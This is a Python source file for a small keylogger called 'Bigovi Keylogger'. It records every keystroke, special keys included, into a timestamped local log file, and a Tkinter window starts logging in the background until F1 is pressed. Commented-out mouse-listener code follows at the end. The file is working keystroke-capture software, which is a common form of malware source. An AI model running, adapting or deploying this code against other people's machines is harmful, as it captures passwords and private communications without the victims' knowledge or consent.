#!/usr/bin/python3
from tkinter import *
from tkinter import messagebox
from pynput import keyboard
import time
import os


with open('./LOGs/{}.txt'.format(time.ctime()[:-4]), 'w') as log:

    def on_press(key):
        try:
            log.write('{0}'.format(key.char))

        except AttributeError:
            if (key == keyboard.Key.enter):
                log.write('\n')
            elif (key == keyboard.Key.space):
                log.write(' ')
            elif (key == keyboard.Key.backspace):
                log.write(' _<-_ ')
            elif (key == keyboard.Key.ctrl_r):
                log.write(' _ctrl_ ')
            elif (key == keyboard.Key.ctrl):
                log.write(' _ctrl_ ')
            elif (key == keyboard.Key.shift_r):
                log.write(' _shift_ ')
            elif (key == keyboard.Key.shift):
                log.write(' _shift_ ')
            elif (key == keyboard.Key.caps_lock):
                log.write(' _CAPS_ ')
            elif (key == keyboard.Key.alt):
                log.write(' _Alt_ ')
            elif (key == keyboard.Key.tab):
                log.write(' _tab_ ')
            elif (key == keyboard.Key.f1):
                log.write('')
            else:
                log.write(' {0} '.format(key))

    def on_release(key):
        if key == keyboard.Key.f1:
            return False

    # on_release=on_release



    def box():
        messagebox.showinfo("Info", "press F1 to end Keylogging")
        start_btn.config(text="START KEYLOGGER", command= real)



    def real():
        root.destroy()
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

        listener = keyboard.Listener(
            on_press=on_press, on_release=on_release)
        listener.start()

    root = Tk()
    root.title('Bigovi Keylogger')
    root.geometry('500x250')

    title = Label(root, text="Keylogger", font=("sans-serif", 20))
    nothing = Label(root, text=" ")
    line1 = Label(root, text="to start bigovi Keylogger in background", font=('sans-serif', 14))
    line2 = Label(root, text="click the button bellow", font=('sans-serif', 14))
    title.pack()
    nothing.pack()
    line1.pack()
    line2.pack()
    nothing.pack()
    nothing.pack()
    start_btn = Button(root, text="START", bg="black", fg='white', command= box)
    start_btn.pack(side='bottom', fill = BOTH, expand = True)

    root.mainloop()




# def on_click(x, y, button, pressed):
#     print('{0} at {1}'.format(
#         'Pressed' if pressed else 'Released',
#         (x, y)))
#     if not pressed:
#         # Stop listener
#         return False

# def on_scroll(x, y, dx, dy):
#     print('Scrolled {0} at {1}'.format(
#         'down' if dy < 0 else 'up',
#         (x, y)))

# # Collect events until released
# with mouse.Listener(
#         on_move=on_move,
#         on_click=on_click,
#         on_scroll=on_scroll) as listener:
#     listener.join()

# # ...or, in a non-blocking fashion:
# listener = mouse.Listener(
#     on_move=on_move,
#     on_click=on_click,
#     on_scroll=on_scroll)
# listener.start()
